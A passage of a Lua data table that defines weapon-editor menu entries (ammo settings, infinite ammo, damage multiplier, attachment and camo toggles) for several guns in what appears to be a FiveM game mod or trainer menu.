            {text = 'Flat muzzle break', dkey = 'weapon:combatmg_mk2_flatmuzzlebreak', desc = 'Enable the flat muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_01`},
            {text = 'Tactical muzzle break', dkey = 'weapon:combatmg_mk2_tacticalmuzzlebreak', desc = 'Enable the tactical muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_02`},
            {text = 'Fat-end muzzle break', dkey = 'weapon:combatmg_mk2_fat-endmuzzlebreak', desc = 'Enable the fat-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_03`},
            {text = 'Precision muzzle break', dkey = 'weapon:combatmg_mk2_precisionmuzzlebreak', desc = 'Enable the precision muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_04`},
            {text = 'Heavy duty muzzle break', dkey = 'weapon:combatmg_mk2_heavydutymuzzlebreak', desc = 'Enable the heavy duty muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_05`},
            {text = 'Slanted muzzle break', dkey = 'weapon:combatmg_mk2_slantedmuzzlebreak', desc = 'Enable the slanted muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_06`},
            {text = 'Split-end muzzle break', dkey = 'weapon:combatmg_mk2_split-endmuzzlebreak', desc = 'Enable the split-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_07`},
            {text = 'Default barrel', dkey = 'weapon:combatmg_mk2_defaultbarrel', desc = 'Enable the default barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MG_BARREL_01`},
            {text = 'Heavy barrel', dkey = 'weapon:combatmg_mk2_heavytbarrel', desc = 'Enable the heavy barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MG_BARREL_02`},
            {text = 'Digital camo', dkey = 'weapon:combatmg_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:combatmg_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:combatmg_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:combatmg_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:combatmg_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:combatmg_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:combatmg_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:combatmg_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:combatmg_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:combatmg_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:combatmg_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CAMO_IND_01`},
        },
        
        ['weapon:gusenberg'] = {
            {text = 'Set ammo', dkey = 'weapon:gusenberg_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:gusenberg_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:gusenberg_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:gusenberg_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:gusenberg_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:gusenberg_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_GUSENBERG_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:gusenberg_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_GUSENBERG_CLIP_02`},
        },
        
        ['weapon:sniperrrifle'] = {
            {text = 'Set ammo', dkey = 'weapon:sniperrifle_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:sniperrifle_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:sniperrifle_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:sniperrifle_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:sniperrifle_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:sniperrifle_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNIPERRIFLE_CLIP_01`},
            {text = 'Suppressor', dkey = 'weapon:sniperrifle_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP_02`},
            {text = 'Scope', dkey = 'weapon:sniperrifle_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_LARGE`},
            {text = 'Advanced scope', dkey = 'weapon:sniperrifle_advancedscope', desc = 'Enable the advanced scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MAX`},
            {text = 'Wood grip finish', dkey = 'weapon:sniperrifle_woodgripfinish', desc = 'Enable the wood grip finish.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false,extra = `COMPONENT_SNIPERRIFLE_VARMOD_LUXE`},
        },
        
        ['weapon:heavysniper'] = {
            {text = 'Set ammo', dkey = 'weapon:heavysniper_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:heavysniper_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:heavysniper_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:heavysniper_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:heavysniper_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:heavysniper_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_CLIP_01`},
            {text = 'Scope', dkey = 'weapon:heavysniper_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_LARGE`},
            {text = 'Advanced scope', dkey = 'weapon:heavysniper_advancedscope', desc = 'Enable the advanced scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MAX`},
        },
        
        ['weapon:marksmanrifle_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:marksmanrifle_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:marksmanrifle_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:marksmanrifle_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:marksmanrifle_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:marksmanrifle_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:marksmanrifle_mk2_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:marksmanrifle_mk2_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CLIP_02`},
            {text = 'Tracer rounds', dkey = 'weapon:marksmanrifle_mk2_tracerrounds', desc = 'Enable the tracer rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER`},
            {text = 'Incendiary rounds', dkey = 'weapon:marksmanrifle_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY`},
            {text = 'Armor piercing rounds', dkey = 'weapon:marksmanrifle_mk2_armorpiercingrounds', desc = 'Enable the armor piercing rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING`},
            {text = 'Metal jacket rounds', dkey = 'weapon:marksmanrifle_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ`},
            {text = 'Flashlight', dkey = 'weapon:marksmanrifle_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Holographic sight', dkey = 'weapon:marksmanrifle_mk2_holographicsight', desc = 'Enable the holographic sight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SIGHTS`},
            {text = 'Large scope', dkey = 'weapon:marksmanrifle_mk2_largescope', desc = 'Enable the large scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MEDIUM_MK2`},
            {text = 'Zoom scope', dkey = 'weapon:marksmanrifle_mk2_zoomscope', desc = 'Enable the zoom scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2`},
            {text = 'Suppressor', dkey = 'weapon:marksmanrifle_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP`},
            {text = 'Grip', dkey = 'weapon:marksmanrifle_mk2_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP_02	`},
            {text = 'Flat muzzle break', dkey = 'weapon:marksmanrifle_mk2_flatmuzzlebreak', desc = 'Enable the flat muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_01`},
            {text = 'Tactical muzzle break', dkey = 'weapon:marksmanrifle_mk2_tacticalmuzzlebreak', desc = 'Enable the tactical muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_02`},
            {text = 'Fat-end muzzle break', dkey = 'weapon:marksmanrifle_mk2_fat-endmuzzlebreak', desc = 'Enable the fat-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_03`},
            {text = 'Precision muzzle break', dkey = 'weapon:marksmanrifle_mk2_precisionmuzzlebreak', desc = 'Enable the precision muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_04`},
            {text = 'Heavy duty muzzle break', dkey = 'weapon:marksmanrifle_mk2_heavydutymuzzlebreak', desc = 'Enable the heavy duty muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_05`},
            {text = 'Slanted muzzle break', dkey = 'weapon:marksmanrifle_mk2_slantedmuzzlebreak', desc = 'Enable the slanted muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_06`},
            {text = 'Split-end muzzle break', dkey = 'weapon:marksmanrifle_mk2_split-endmuzzlebreak', desc = 'Enable the split-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_07`},
            {text = 'Default barrel', dkey = 'weapon:marksmanrifle_mk2_defaultbarrel', desc = 'Enable the default barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MG_BARREL_01`},
            {text = 'Heavy barrel', dkey = 'weapon:marksmanrifle_mk2_heavytbarrel', desc = 'Enable the heavy barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MG_BARREL_02`},
            {text = 'Digital camo', dkey = 'weapon:marksmanrifle_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:marksmanrifle_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:marksmanrifle_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:marksmanrifle_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:marksmanrifle_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:marksmanrifle_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:marksmanrifle_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:marksmanrifle_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:marksmanrifle_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:marksmanrifle_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:marksmanrifle_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MARKSMANRIFLE_MK2_CAMO_IND_01`},
        },
        
        ['weapon:heavysniper_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:heavysniper_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:heavysniper_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:heavysniper_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:heavysniper_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:heavysniper_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:heavysniper_mk2_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:heavysniper_mk2_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CLIP_02`},
            {text = 'Incendiary rounds', dkey = 'weapon:heavysniper_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY`},
            {text = 'Armor piercing rounds', dkey = 'weapon:heavysniper_mk2_armorpiercingrounds', desc = 'Enable the armor piercing rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING`},
            {text = 'Metal jacket rounds', dkey = 'weapon:heavysniper_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ`},
            {text = 'Explosive rounds', dkey = 'weapon:heavysniper_mk2_explosiverounds', desc = 'Enable the explosive rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE`},
            {text = 'Advanced scope', dkey = 'weapon:heavysniper_mk2_advancedscope', desc = 'Enable the advanced scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MAX`},
            {text = 'Zoom scope', dkey = 'weapon:heavysniper_mk2_zoomscope', desc = 'Enable the zoom scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_LARGE_MK2`},
            {text = 'Night vision  scope', dkey = 'weapon:heavysniper_mk2_nightvisionscope', desc = 'Enable the night vision scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_NV`},
            {text = 'Thermal scope', dkey = 'weapon:heavysniper_mk2_thermalscope', desc = 'Enable the thermal scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_THERMAL`},
            {text = 'Suppressor', dkey = 'weapon:heavysniper_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SR_SUPP_03`},
            {text = 'Squared muzzle break', dkey = 'weapon:heavysniper_mk2_squaredmuzzlebreak', desc = 'Enable the squared muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_08`},
            {text = 'Bell-end muzzle break', dkey = 'weapon:heavysniper_mk2_bell-endmuzzlebreak', desc = 'Enable the bell end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_09`},
            {text = 'Default barrel', dkey = 'weapon:heavysniper_mk2_defaultbarrel', desc = 'Enable the default barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SR_BARREL_01`},
            {text = 'Heavy barrel', dkey = 'weapon:heavysniper_mk2_heavytbarrel', desc = 'Enable the heavy barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SR_BARREL_02`},
            {text = 'Digital camo', dkey = 'weapon:heavysniper_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:heavysniper_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:heavysniper_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:heavysniper_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:heavysniper_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSNIPER_MK2_CAMO_05`},
